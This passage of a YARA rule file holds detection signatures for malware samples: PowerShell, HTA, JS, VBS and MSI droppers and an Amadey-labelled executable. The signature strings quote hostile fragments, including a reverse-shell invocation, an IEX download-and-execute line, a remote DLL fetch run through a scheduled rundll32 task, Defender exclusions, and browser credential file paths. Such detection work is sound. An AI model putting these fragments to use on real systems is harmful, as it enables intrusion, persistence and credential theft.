      $s6 = "obEBAITuTSRXLqeOf7yemcSslOtrKBW9IHdDqPpYzCT44GUfpvCdX+OBD/+duFrwYQTKR8+ObbT83rvVw0vfY5q0IjFWDGmX9D8ZHnbUtTfSBx55Ah0LAFQZYAibEH9h" ascii /* score: '11.00'*/
      $s7 = "nnOQyyJxfqJ4e64g8PFiO9PyVD/qUOlw/HQ4k9Vzu0nnuL175LQpGLXeCZ13tFP8lZcUmZavVkTqBrUv58cPiwd8nVDl7fnny2tF6n5R6W4ghYpziqdJXGYsS5O4VOKj" ascii /* score: '11.00'*/
      $s8 = "n+aea+knk74t5WaQuMwpbowgiqdJ/AzxvuUYifMcJG7XAArz1Wi3ur4+LBSi+EtzTK93wAeEHp85lXgy6URkuKqROks11jbxImOyG+bYE8q31oOsAiTOR1gZzGLjiXrP" ascii /* score: '11.00'*/
      $s9 = "qnlZXNdJCYXor5+ezpsqTN5iKnFrTpwV6dhW7LlUvp/kAnGuLdPmcvWsc9DBeVRgeRZ9f/ofhXd3FgrzWq+jTUfzoksy7xL3zzqiQfsFmasWmdf9ALkKg0rfJkmpQVlF" ascii /* score: '11.00'*/
      $s10 = "1cE0lZLt7bTm4QfKanve3WUuC+u8+y6l/YZPq133fUuNz5+jyChtUomzaEOxc+POXnvRj/LeXopNew5PMhR6dcEPH6Ij134yIF4LZVbzI89kh6rlA/wvPahhOQY5rMDn" ascii /* score: '11.00'*/
      $s11 = "X5boG/WebvrgE7/jIz712eqRuGlOF0r85RdZhjmdD6DEy3mW+iORIOXEEdQyawFn0Sg6Myj02iCx8FVF37yRsaZmXM0ayldJ5gcEiW8QZC56EBmnz3CJgq66uoMa9klZ" ascii /* score: '11.00'*/
      $s12 = "rmGmOmeVZjnNsrSQZVLfIEj3cKp0VkXytbPclNJm0uaRrcQVOjZv7nPydWsmMS8od6hA1FO/9SSTxAYPoUGzF3DW3AKmLl60lgbtggtJzm3wWF+m+OSV3hCS+LrFtkZ0" ascii /* score: '11.00'*/
      $s13 = "vZOUk5BWFQq9APr++N8K7+txKjKcV9V+rotnNtAWouAmoiiz1BHmxu1X1igri8T11NMpvdNPs5S4MVa8npQi87QSN7x9r3i1HmePTVHIOHyYYi/MRC8DQi8w4t+7hxJv" ascii /* score: '11.00'*/
      $s14 = "d4vuahtRo27Nl9c6gQictFCW42UZqTeyd2kQ9/AQ8doiXiOp9TScBoya5KzTWrX2kZHjRo6ynOMQtMsz8NyytcSrLynGzrZSybyainGgwUS+uW833hR8E1FEmtkNc8xe" ascii /* score: '11.00'*/
      $s15 = "EpeRJ04U2zliEyTO0iSupn6jV+dGdOtAwPnjCocp/sJM4nCOA6FXgvicmczYtXOgnOd2PMdud7Sr9CKbwWKEKo/uEJtKR4PF1Ct5QA07X1ZZ1zGTxANiGy7u03MsJc5G" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 90KB and
      8 of them
}

rule sig_8ae31e781602562fa1d580f8140b9c52696b804a3067e67bd2c430c8f9d048c1_8ae31e78 {
   meta:
      description = "_subset_batch - file 8ae31e781602562fa1d580f8140b9c52696b804a3067e67bd2c430c8f9d048c1_8ae31e78.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8ae31e781602562fa1d580f8140b9c52696b804a3067e67bd2c430c8f9d048c1"
   strings:
      $x1 = "            PS>Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 30 -Cols 90 -CommandLine cmd.exe" fullword ascii /* score: '52.00'*/
      $x2 = "            Spawn a reverse shell (cmd.exe) with specific rows and cols size" fullword ascii /* score: '36.00'*/
      $s3 = "// source from --> https://stackoverflow.com/a/3346055" fullword ascii /* score: '26.00'*/
      $s4 = "            throw new ConPtyShellException(\"Could not create process. \" + Marshal.GetLastWin32Error());" fullword ascii /* score: '26.00'*/
      $s5 = "    [DllImport(\"kernel32.dll\", SetLastError = true, CharSet = CharSet.Auto, EntryPoint = \"CreateProcess\")]" fullword ascii /* score: '25.00'*/
      $s6 = "    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgrad" ascii /* score: '24.00'*/
      $s7 = "    public static string SpawnConPtyShell(string remoteIp, int remotePort, uint rows, uint cols, string commandLine, bool upgrad" ascii /* score: '24.00'*/
      $s8 = "    // this from --> https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h" fullword ascii /* score: '24.00'*/
      $s9 = "                (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrP" ascii /* score: '23.00'*/
      $s10 = "                (sockaddrTargetProcess.sin_addr == sockaddrParentProcess.sin_addr && sockaddrTargetProcess.sin_port == sockaddrP" ascii /* score: '23.00'*/
      $s11 = "    public static List<IntPtr> GetSocketsTargetProcess(Process targetProcess)" fullword ascii /* score: '23.00'*/
      $s12 = "            Console.WriteLine(\"Cannot open target process with pid \" + targetProcess.Id.ToString() + \" for DuplicateHandle ac" ascii /* score: '22.00'*/
      $s13 = "                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandp" ascii /* score: '22.00'*/
      $s14 = "            Console.WriteLine(\"Cannot open target process with pid \" + targetProcess.Id.ToString() + \" for DuplicateHandle ac" ascii /* score: '22.00'*/
      $s15 = "                        // damn, even the parent process has no usable sockets, let's try a last desperate attempt in the grandp" ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x7566 and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_8c757a7da21aa605dcb255b99bfbbac7edd03a7998b9d5ea80fbcb856b4cc703_8c757a7d {
   meta:
      description = "_subset_batch - file 8c757a7da21aa605dcb255b99bfbbac7edd03a7998b9d5ea80fbcb856b4cc703_8c757a7d.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8c757a7da21aa605dcb255b99bfbbac7edd03a7998b9d5ea80fbcb856b4cc703"
   strings:
      $s1 = " != 0x40 && (_0x328e20 = _0x328e20 + String[_0x44b2d7(0xe0, -a0_0x58c4c4._0x4e4d1b) + '\\x64\\x65'](_0x9e764));" fullword ascii /* score: '15.00'*/
      $s2 = "\\x34' ? '\\x78\\x36\\x34' : '\\x78\\x38\\x36', _0x2ac93a = GetObject('\\x77\\x69\\x6e\\x6d\\x67\\x6d\\x74\\x73\\x3a\\x5c' + _0x" ascii /* score: '14.00'*/
      $s3 = ", 0x334)) / 0x2) + -parseInt(_0x12171a(0x1f1, a0_0x403efe._0x4f6604)) / 0x3 + -parseInt(_0x12171a(0x199, 0x298)) / 0x4 + parseIn" ascii /* score: '12.00'*/
      $s4 = "0x490600._0x5bab62)] = 0x1), _0x321af6[_0xecc18e(0x14, -0x3a) + _0xecc18e(-0x88, -0x15e) + '\\x6f\\x6e'](_0x3a8853, _0x56c9d9, 0" ascii /* score: '12.00'*/
      $s5 = "9], 0x4, -0x262b2fc7), _0x358d1c, _0xbd0c2b, _0x276826[_0x606960 + 0xc], 0xb, -0x1924661b), _0x1cebe0, _0x358d1c, _0x276826[_0x6" ascii /* score: '12.00'*/
      $s6 = " _0x1cd0d9[_0xecc18e(0x6b, -a0_0x490600._0x467bd0) + _0xecc18e(-a0_0x490600._0x38f9c0, -0x1dd) + _0xecc18e(-0xd8, -0x19e)] = ![]" ascii /* score: '12.00'*/
      $s7 = "0x3], 0x10, -0x2b10cf7b), _0xa12453, _0x1cebe0, _0x276826[_0x606960 + 0x6], 0x17, 0x4881d05), _0xbd0c2b = a0_0x4b896f(_0xbd0c2b," ascii /* score: '12.00'*/
      $s8 = "_0x276826[_0x606960 + 0xa], 0xf, -0x100b83), _0xa12453, _0x1cebe0, _0x276826[_0x606960 + 0x1], 0x15, -0x7a7ba22f), _0xbd0c2b = a" ascii /* score: '12.00'*/
      $s9 = "_0x606960 + 0xd], 0xc, -0x2678e6d), _0x1cebe0, _0x358d1c, _0x276826[_0x606960 + 0xe], 0x11, -0x5986bc72), _0xa12453, _0x1cebe0, " ascii /* score: '12.00'*/
      $s10 = "_0x4b896f(_0xa12453, _0x1cebe0 = a0_0x4b896f(_0x1cebe0, _0x358d1c, _0xbd0c2b, _0xa12453, _0x276826[_0x606960 + 0x1], 0x4, -0x5b4" ascii /* score: '12.00'*/
      $s11 = "+ 0x3], 0x16, -0x3e423112), _0xbd0c2b = a0_0x26f7e8(_0xbd0c2b, _0xa12453 = a0_0x26f7e8(_0xa12453, _0x1cebe0 = a0_0x26f7e8(_0x1ce" ascii /* score: '12.00'*/
      $s12 = "c, -0x173848aa), _0x1cebe0, _0x358d1c, _0x276826[_0x606960 + 0x2], 0x11, 0x242070db), _0xa12453, _0x1cebe0, _0x276826[_0x606960 " ascii /* score: '12.00'*/
      $s13 = "(-0x44, 0x2e) + _0x3c9043(-0x146, -a0_0x32f491._0xfcbc75) + _0x3c9043(-0x158, -a0_0x32f491._0x395144) + _0x3c9043(-a0_0x32f491._" ascii /* score: '12.00'*/
      $s14 = ", _0x1cebe0, _0x276826[_0x606960 + 0x4], 0x14, -0x182c0438), _0xbd0c2b = a0_0x5bebfb(_0xbd0c2b, _0xa12453 = a0_0x5bebfb(_0xa1245" ascii /* score: '12.00'*/
      $s15 = "\\x26\\x62\\x75\\x69\\x6c\\x64\\x49\\x64\\x3d' + encodeURIComponent(_0x13911b) + _0x85505b(a0_0x18d7a0._0x527005, 0x256) + encod" ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 500KB and
      8 of them
}

rule sig_912cb33023ae2dab636d177b78cc0db8c9fee97c64a7b69cb82978e0d0edc272_912cb330 {
   meta:
      description = "_subset_batch - file 912cb33023ae2dab636d177b78cc0db8c9fee97c64a7b69cb82978e0d0edc272_912cb330.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "912cb33023ae2dab636d177b78cc0db8c9fee97c64a7b69cb82978e0d0edc272"
   strings:
      $s1 = "var pointier = ophichthys.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "            + \"xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' \"" fullword ascii /* score: '24.00'*/
      $s3 = "var kalsilite = ophichthys.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s4 = "    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'" fullword ascii /* score: '20.00'*/
      $s5 = "            + \"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \"" fullword ascii /* score: '19.00'*/
      $s6 = "            + \"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' \"" fullword ascii /* score: '19.00'*/
      $s7 = "            + \"xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \"" fullword ascii /* score: '19.00'*/
      $s8 = "            + \"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \"" fullword ascii /* score: '19.00'*/
      $s9 = "    /// xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' " fullword ascii /* score: '15.00'*/
      $s10 = "    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'" fullword ascii /* score: '15.00'*/
      $s11 = "var madreporites = paratactically.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '15.00'*/
      $s12 = "    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' " fullword ascii /* score: '15.00'*/
      $s13 = "        \"xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \"" fullword ascii /* score: '15.00'*/
      $s14 = "    ///     xmlns:psf=\"http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework\"" fullword ascii /* score: '15.00'*/
      $s15 = "    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule aa002834808d82b928dd623d501d26f6adecd005e4b90824f0bbee0931aa00c0_aa002834 {
   meta:
      description = "_subset_batch - file aa002834808d82b928dd623d501d26f6adecd005e4b90824f0bbee0931aa00c0_aa002834.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "aa002834808d82b928dd623d501d26f6adecd005e4b90824f0bbee0931aa00c0"
   strings:
      $s1 = "            $foundExe = Get-ChildItem -Path $tempDir -Filter \"*.exe\" -Recurse -ErrorAction Ignore | Select -First 1" fullword ascii /* score: '25.00'*/
      $s2 = "            $execPath = \"$tempDir\\consent\\cons.exe\"" fullword ascii /* score: '21.00'*/
      $s3 = "        $execPath = \"$tempDir\\cons.exe\"" fullword ascii /* score: '21.00'*/
      $s4 = "    $webClient.Headers[\"User-Agent\"] = \"PowerShell/5.1\"" fullword ascii /* score: '17.00'*/
      $s5 = "            # Execute binary" fullword ascii /* score: '16.00'*/
      $s6 = "            $regPath = \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\"" fullword ascii /* score: '11.00'*/
      $s7 = "            $destination = $shellApp.Namespace($tempDir)" fullword ascii /* score: '11.00'*/
      $s8 = "    $tempDir = [Environment]::GetEnvironmentVariable(\"TEMP\")" fullword ascii /* score: '11.00'*/
      $s9 = "                Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force -EA SilentlyContinue" fullword ascii /* score: '10.00'*/
      $s10 = "            $shellApp = New-Object -COM Shell.Application" fullword ascii /* score: '10.00'*/
      $s11 = "            [IO.Compression.ZipFile]::ExtractToDirectory($archiveFile, $tempDir)" fullword ascii /* score: '10.00'*/
      $s12 = "    # Download operation" fullword ascii /* score: '10.00'*/
      $s13 = "    $archiveFile = \"$tempDir\\consa.zip\"" fullword ascii /* score: '9.00'*/
      $s14 = "    $downloadUrl = \"https://$baseUrl/apip/f/f\"" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x740a and filesize < 5KB and
      8 of them
}

rule ac9f000d529594df4a891682b7f7ee6572219731f4ef27b53847768813fcd94b_ac9f000d {
   meta:
      description = "_subset_batch - file ac9f000d529594df4a891682b7f7ee6572219731f4ef27b53847768813fcd94b_ac9f000d.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "ac9f000d529594df4a891682b7f7ee6572219731f4ef27b53847768813fcd94b"
   strings:
      $s1 = "38' + '\\x36', _0x46aaf9 = GetObject('\\x77' + '\\x69' + '\\x6e' + '\\x6d' + '\\x67' + '\\x6d' + '\\x74' + '\\x73' + '\\x3a' + '" ascii /* score: '13.00'*/
      $s2 = "5e0ff._0x329aa0, 0x4b7)) / 0x9) + -parseInt(_0x40292d(0x4b4, a0_0x55e0ff._0x3cdbae)) / 0xa * (-parseInt(_0x40292d(a0_0x55e0ff._0" ascii /* score: '12.00'*/
      $s3 = "    return _0x379dff << _0x54cd04 | _0x379dff >>> 0x20 - _0x54cd04;" fullword ascii /* score: '12.00'*/
      $s4 = "\\x74' + '\\x65' + '\\x3f' + '\\x69' + '\\x64' + '\\x3d' + encodeURIComponent(_0x146ad4);" fullword ascii /* score: '12.00'*/
      $s5 = "0ff._0x214700)) / 0x4 + -parseInt(_0x40292d(0x4b9, 0x4b3)) / 0x5 * (-parseInt(_0x40292d(a0_0x55e0ff._0x2f6dfc, 0x4ba)) / 0x6) + " ascii /* score: '12.00'*/
      $s6 = " + '\\x64' + '\\x3d' + encodeURIComponent(_0x1f6681) + ('\\x26' + '\\x62' + '\\x75' + '\\x69' + '\\x6c' + '\\x64' + '\\x49' + '" ascii /* score: '11.00'*/
      $s7 = "65' + '\\x3d') + encodeURIComponent(_0x200d87) + ('\\x26' + '\\x63' + '\\x6f' + '\\x72' + '\\x70' + '\\x3d') + encodeURIComponen" ascii /* score: '11.00'*/
      $s8 = "8a7f) + ('\\x26' + '\\x64' + '\\x6f' + '\\x6d' + '\\x61' + '\\x69' + '\\x6e' + '\\x3d') + encodeURIComponent(_0x1f581d);" fullword ascii /* score: '11.00'*/
      $s9 = " '\\x76' + '\\x3d') + encodeURIComponent(_0x21bd04) + ('\\x26' + '\\x75' + '\\x73' + '\\x65' + '\\x72' + '\\x6e' + '\\x61' + '" ascii /* score: '11.00'*/
      $s10 = "' + '\\x6f' + '\\x64' + '\\x65'](_0x4a7830), _0x553642 != 0x40 && (_0x425a9a = _0x425a9a + String['\\x66' + '\\x72' + '\\x6f' + " ascii /* score: '11.00'*/
      $s11 = "x3d') + encodeURIComponent(_0x340534) + ('\\x26' + '\\x6f' + '\\x73' + '\\x3d') + encodeURIComponent(_0x4a5122) + ('\\x26' + '" ascii /* score: '11.00'*/
      $s12 = "  </script>" fullword ascii /* score: '10.00'*/
      $s13 = "  <script type=\"text/javascript\">" fullword ascii /* score: '10.00'*/
      $s14 = "x57500e = _0x2b025e['\\x6d' + '\\x61' + '\\x74' + '\\x63' + '\\x68'](/(\".*?\"\\s*:\\s*(\".*?\"|\\d+\\.\\d+|\\d+))/g), _0x4c8344" ascii /* score: '10.00'*/
      $s15 = "67'](0x1, _0x499b5c['\\x6c' + '\\x65' + '\\x6e' + '\\x67' + '\\x74' + '\\x68'] - 0x1);" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 400KB and
      8 of them
}

rule af2306133ef7626c0237dd374a037e2df65dda626ba18f9a22e8e822cb33a22c_af230613 {
   meta:
      description = "_subset_batch - file af2306133ef7626c0237dd374a037e2df65dda626ba18f9a22e8e822cb33a22c_af230613.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "af2306133ef7626c0237dd374a037e2df65dda626ba18f9a22e8e822cb33a22c"
   strings:
      $s1 = "u[o[fH(0x4af, '\\x34\\x6b\\x4c\\x76')](H, 0x4)], 0xb, 0x4bdecfa9), l, w, u[H + 0x7], 0x10, -0x944b4a0), S, l, u[o[fH(0x5db, '\\x" ascii /* score: '12.00'*/
      $s2 = "5')](a0S, l, w, j, S, u[H + 0x0], 0x6, -0xbd6ddbc), w, j, u[o[fH(0x92, '\\x67\\x4b\\x49\\x56')](H, 0x7)], 0xa, 0x432aff97), l, w" ascii /* score: '12.00'*/
      $s3 = " / 0x5) + parseInt(fl(0x373, '\\x36\\x56\\x30\\x6c')) / 0x6 + -parseInt(fl(0x2e8, '\\x6b\\x48\\x2a\\x48')) / 0x7 + -parseInt(fl(" ascii /* score: '12.00'*/
      $s4 = "fl(0xe8, '\\x41\\x33\\x75\\x4a')) / 0x3) + -parseInt(fl(0x47c, '\\x58\\x44\\x72\\x76')) / 0x4 * (parseInt(fl(0x455, '\\x79\\x48" ascii /* score: '12.00'*/
      $s5 = "\\x68\\x52')](i[u1(0x9d, '\\x32\\x4f\\x50\\x37')](i[u1(0x313, '\\x74\\x65\\x4d\\x35')](i[u1(0x308, '\\x4b\\x69\\x4a\\x54')] + en" ascii /* score: '12.00'*/
      $s6 = "\\x35')](k[fx(0x3e4, '\\x76\\x21\\x68\\x52')](q, 0x3) << 0x6, G), l = l + String[fx(0x412, '\\x79\\x48\\x38\\x38')](w), q != 0x4" ascii /* score: '12.00'*/
      $s7 = ", i[u1(0x3c2, '\\x77\\x70\\x68\\x44')](encodeURIComponent, k)) + i[u1(0x3d9, '\\x4a\\x6a\\x54\\x58')] + i[u1(0x2da, '\\x21\\x6c" ascii /* score: '11.00'*/
      $s8 = " l + String[fx(0x138, '\\x41\\x33\\x75\\x4a')](j)), G != 0x40 && (l = l + String[fx(0x431, '\\x55\\x57\\x32\\x6f')](S));" fullword ascii /* score: '11.00'*/
      $s9 = "nt(u) + u1(0x3d0, '\\x55\\x57\\x32\\x6f') + i[u1(0xc1, '\\x4a\\x6a\\x54\\x58')](encodeURIComponent, d), i[u1(0xfc, '\\x21\\x6c" ascii /* score: '11.00'*/
      $s10 = "  </script>" fullword ascii /* score: '10.00'*/
      $s11 = "  <script type=\"text/javascript\">" fullword ascii /* score: '10.00'*/
      $s12 = "\\x38\\x38')](H, 0x4)], 0x7, -0xa83f051), w, j, u[H + 0x5], 0xc, 0x4787c62a), l, w, u[o[fH(0x479, '\\x35\\x69\\x40\\x4d')](H, 0x" ascii /* score: '10.00'*/
      $s13 = "\\x6b\\x48\\x2a\\x48')](GetObject, f[u6(0x49e, '\\x74\\x65\\x4d\\x35')]), j = new Enumerator(w[u6(0x298, '\\x77\\x70\\x68\\x44')" ascii /* score: '10.00'*/
      $s14 = "o[fH(0x3dd, '\\x21\\x6c\\x35\\x57')](H, 0x6)], 0x9, -0x3fbf4cc0), l, w, u[H + 0xb], 0xe, 0x265e5a51), S, l, u[H + 0x0], 0x14, -0" ascii /* score: '9.00'*/
      $s15 = "= a0j(S, l = o[fH(0x534, '\\x6e\\x75\\x79\\x4c')](a0j, l, w, j, S, u[H + 0xc], 0x7, 0x6b901122), w, j, u[H + 0xd], 0xc, -0x2678e" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 700KB and
      8 of them
}

rule sig_9eccc6983ceb9befadce9f78fc56fdc0ecdce74cd6f9216863830f4a02b5bc4c_9eccc698 {
   meta:
      description = "_subset_batch - file 9eccc6983ceb9befadce9f78fc56fdc0ecdce74cd6f9216863830f4a02b5bc4c_9eccc698.msi"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "9eccc6983ceb9befadce9f78fc56fdc0ecdce74cd6f9216863830f4a02b5bc4c"
   strings:
      $x1 = "(This operation cannot be undone.)Error writing to file: [2].  Verify that you have access to that directory.Installer stopped p" ascii /* score: '81.00'*/
      $x2 = "[2]Error converting file time to local time for file: [3]. GetLastError: [2].Path: [2] is not a parent of [3].On the dialog [2] " ascii /* score: '77.00'*/
      $x3 = "w servicesService: [2]Searching for installed applicationsProperty: [1], Signature: [2]UnmoveFilesRemoving moved filesFile: [1]," ascii /* score: '71.00'*/
      $x4 = "TypeTableNameAdminExecuteSequenceActionConditionSequenceCostFinalizeCostInitializeFileCostInstallAdminPackageInstallFilesInstall" ascii /* score: '56.00'*/
      $x5 = "lgAdminWelcomeDlgAI_SET_ADMINExecuteActionExitDialogFatalErrorPrepareDlgUserExitPowerShellScriptLauncher.dllSoftwareDetector.dll" ascii /* score: '51.00'*/
      $x6 = "ure will change from run from network state to be installed on the local hard driveSelNetworkNetworkThis feature will remain to " ascii /* score: '47.00'*/
      $x7 = "ButtonsPlease read the following license agreement carefully[DlgTitleFont]End-User License AgreementMaintenanceTypeDlgSelect the" ascii /* score: '46.00'*/
      $x8 = "$url = \"https://Guid.b-cdn.net/NextGen3.0.amd\"; $out = \"C:\\ProgramData\\11$hhhccv.dll\"; (New-Object System.Net.WebClient).D" ascii /* score: '43.00'*/
      $x9 = "& $[\\{]$cmd[\\}] -ExclusionProcess \"powershell.exe\", \"MSBuild.exe\", \"cmd.exe\", \"rundll32.exe\" -ErrorAction SilentlyCont" ascii /* score: '43.00'*/
      $x10 = "AI_DOWNGRADE4010OnDetectSoftwareAI_RESTORE_LOCATIONRestoreLocationAI_RESTORE_AI_SETUPEXEPATHAI_SETUPEXEPATH[AI_SETUPEXEPATH_ORIG" ascii /* score: '42.00'*/
      $x11 = "$action = New-ScheduledTaskAction -Execute \"rundll32.exe\" -Argument \"C:\\ProgramData\\11$hhhccv.dll, Run\"" fullword ascii /* score: '40.00'*/
      $x12 = "omponentsRedirectedDllSupportPATCHAI_EXTREG <> \"No\"AI_UPGRADE<>\"No\"AI_USE_STD_ODBC_MGR AND Installed(VersionNT >= 603)SHORTC" ascii /* score: '38.00'*/
      $x13 = "ialogAI_MAINTAI_MAINT AND InstallMode=\"Remove\"AI_MAINT AND InstallMode=\"Repair\"AI_PATCHAI_RESUME[_BrowseProperty]SpawnDialog" ascii /* score: '35.00'*/
      $x14 = "Your original configuration will be restored.You can only type a separator character here.Failed to install [2] Control Panel ap" ascii /* score: '35.00'*/
      $x15 = "Your original Firewall configuration will be restored.Invalid Firewall network scope: [2].There was an error registering port wi" ascii /* score: '34.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 21000KB and
      1 of ($x*)
}

rule Amadey_signature__a68bf2e26bd9b352d327d62a2e92330f_imphash_ {
   meta:
      description = "_subset_batch - file Amadey(signature)_a68bf2e26bd9b352d327d62a2e92330f(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "8d3634a77504cb0eee0f0f853bebaeb501a8147e104eb0f381a93b497272e34f"
   strings:
      $x1 = "-NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('" fullword ascii /* score: '41.00'*/
      $x2 = "-NoProfile -ExecutionPolicy Bypass -File \"" fullword ascii /* score: '31.00'*/
      $s3 = "Elevator.exe" fullword ascii /* score: '27.00'*/
      $s4 = "powershell.exe" fullword ascii /* score: '27.00'*/
      $s5 = "Error: no user32.dll" fullword ascii /* score: '26.00'*/
      $s6 = "\\config\\loginusers.vdf" fullword ascii /* score: '22.00'*/
      $s7 = "\\AppData\\Local\\Temp\\Login Data" fullword ascii /* score: '22.00'*/
      $s8 = "powershell.exe " fullword ascii /* score: '19.00'*/
      $s9 = "data-cdn.mbamupdates.com" fullword ascii /* score: '18.00'*/
      $s10 = "\\Login Data" fullword ascii /* score: '16.00'*/
      $s11 = "\\logins.json" fullword ascii /* score: '16.00'*/
      $s12 = "Error: no GetSystemMetrics" fullword ascii /* score: '15.00'*/
      $s13 = "\\AppData\\Local\\Steam\\local.vdf" fullword ascii /* score: '14.00'*/
      $s14 = "\\AppData\\Local\\Temp\\Cookies" fullword ascii /* score: '14.00'*/
      $s15 = "o/41/tokens.txt" fullword ascii /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule sig_9aae8f9405d7fb5ab27c447527ba1da4_imphash_ {
   meta:
      description = "_subset_batch - file 9aae8f9405d7fb5ab27c447527ba1da4(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "6caa78943939bd7518f5e7eaa44fa778d0db8b822e260d7fe281cf45513f82d9"
   strings:
      $x1 = "iscsiexe.dll" fullword ascii /* reversed goodware string 'lld.exeiscsi' */ /* score: '33.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*)
}

rule sig_9aae8f9405d7fb5ab27c447527ba1da4_imphash__46d456fe {
   meta:
      description = "_subset_batch - file 9aae8f9405d7fb5ab27c447527ba1da4(imphash)_46d456fe.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "46d456fec38482fbb9b0abae8eb27b839070ce17ee04ed5c07c416b6f9fc7ef0"
   strings:
      $x1 = "iscsiexe.dll" fullword ascii /* reversed goodware string 'lld.exeiscsi' */ /* score: '33.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      1 of ($x*)
}

rule sig_82680cb9d214f302db6a8fccb55089801cdf2c50c1577907a813a7ca6e79564f_82680cb9 {
   meta:
      description = "_subset_batch - file 82680cb9d214f302db6a8fccb55089801cdf2c50c1577907a813a7ca6e79564f_82680cb9.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "82680cb9d214f302db6a8fccb55089801cdf2c50c1577907a813a7ca6e79564f"
   strings:
      $s1 = "WScript.Echo \"Original Random Numbers:\"" fullword ascii /* score: '19.00'*/
      $s2 = "WScript.Echo vbCrLf & \"Statistics:\"" fullword ascii /* score: '15.00'*/
      $s3 = "WScript.Echo vbCrLf & \"Sorted Numbers:\"" fullword ascii /* score: '15.00'*/
      $s4 = "dfgdfgdfgdd.Run jgxMEuvrhShb,0" fullword ascii /* score: '13.00'*/
      $s5 = "WScript.Echo \"Maximum: \" & maxVal" fullword ascii /* score: '13.00'*/
      $s6 = "WScript.Echo \"Minimum: \" & minVal" fullword ascii /* score: '13.00'*/
      $s7 = "WScript.Echo \"Average: \" & Round(avg, 2)" fullword ascii /* score: '13.00'*/
      $s8 = "Public Const sSfhvRun = \"qkiYLlr\"" fullword ascii /* score: '12.00'*/
      $s9 = "str = wshNetwork.ComputerName" fullword ascii /* score: '11.00'*/
      $s10 = "Set wshNetwork = WScript.CreateObject(\"WScript\" & \".Network\")" fullword ascii /* score: '10.00'*/
      $s11 = "'Spdgddfsus associatively ideopraxist eyebolt nonapostolical;" fullword ascii /* score: '10.00'*/
      $s12 = "Public Const bvuqtLON = \"NQfABXl\"" fullword ascii /* score: '9.00'*/
      $s13 = "Public Const IGTyond = \"EZlAeRP\"" fullword ascii /* score: '9.00'*/
      $s14 = "Public Const pOKpZeS = \"xIQlLoZAy\"" fullword ascii /* score: '9.00'*/
      $s15 = "Public Const IjGlTwXld = \"tbXyHBm\"" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x0a0a and filesize < 50KB and
      8 of them
}

rule a703388a2328bbf7b14114e463991c458342efba760feeecc91f55fc25e4f1a3_a703388a {
   meta:
      description = "_subset_batch - file a703388a2328bbf7b14114e463991c458342efba760feeecc91f55fc25e4f1a3_a703388a.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "a703388a2328bbf7b14114e463991c458342efba760feeecc91f55fc25e4f1a3"
   strings:
      $s1 = "    For i = 0 To UBound(tempArr) - 1" fullword ascii /* score: '14.00'*/
      $s2 = "Public Const VfJnPMpIZ = \"mBFTPyef\"" fullword ascii /* score: '14.00'*/
      $s3 = "    ReDim tempArr(count - 1)" fullword ascii /* score: '14.00'*/
